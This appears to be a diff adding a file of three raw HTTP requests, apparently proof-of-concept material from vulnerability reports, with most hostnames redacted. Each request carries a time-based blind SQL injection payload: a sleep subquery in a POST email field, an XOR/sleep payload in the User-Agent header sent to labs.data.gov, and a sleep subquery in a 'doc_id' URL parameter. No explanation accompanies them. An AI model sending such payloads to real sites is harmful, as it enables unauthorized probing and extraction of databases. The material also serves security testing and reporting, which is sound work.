@@ -1,0 +1,41 @@
+1)
+
+POST /elist/viewem6.php HTTP/1.1
+Host: ████████
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://███████/elist/email_escribe.php?type=R
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+Cookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+rememail=test@att.net'%2b(select*from(select(sleep(2)))a)%2b'
+
+2)
+
+GET /dashboard/datagov/csv_to_json HTTP/1.1
+Referer: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+X-Forwarded-For: 1
+X-Requested-With: XMLHttpRequest
+Host: labs.data.gov
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+Accept: */*
+
+3)
+
+GET /library.php?path=test&doc_id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))WUeh) HTTP/1.1
+Host: ██████
+Connection: keep-alive
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
+Cookie: _ga=GA1.2.1697249984.1548431559
